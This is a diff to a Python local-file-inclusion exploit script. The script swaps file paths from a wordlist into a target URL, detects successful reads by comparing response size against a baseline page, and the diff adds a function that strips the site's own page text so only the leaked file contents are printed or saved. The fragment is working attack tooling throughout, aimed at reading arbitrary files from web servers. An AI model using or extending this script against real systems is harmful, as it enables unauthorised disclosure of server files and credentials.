@@ -16,11 +16,13 @@ def vrfy_args():
         sys.exit()
 
 def exploit_LFI():
+
+    ## Check the default page size when nothing came out of the LFI
     random = "VQ328FEBWUBFI32BUI3BBF"
     URL = args.url.replace('LFI', random)
     page = urlopen(URL)
-    content = page.read()
-    default_size = len(content)
+    default_page = page.read()
+    default_size = len(default_page)
 
     url = args.url
     f = open(args.list)
@@ -29,12 +31,24 @@ def exploit_LFI():
         page = urlopen(url_var)
         content = page.read()
         if len(content) is not default_size:
+
+            if default_size is not 0:
+                final_content = clean_output(content.decode("utf-8"),default_page.decode("utf-8"))
+            else:
+                final_content = content.decode("utf-8")
             if args.dest == None:
-                print("Result for => " + line + "\n" + content.decode("utf-8") + "\n")
+                print("#########################\nResult for => " + line + "#########################" + final_content + "\n")
             else:
                 with open(args.dest, 'a') as f:
-                    f.write("Result for => " + line + "\n" + content.decode("utf-8") + "\n")
+                    f.write("#########################\nResult for => " + line + "#########################" + final_content + "\n")
                     f.close()
+
+
+def clean_output(content,default_page):
+    ## function to only keep the LFI result and remove the value that are part of the website
+    for line in default_page.splitlines():
+        content = content.replace(line, '')
+    return content
 
 
 if __name__ == '__main__':
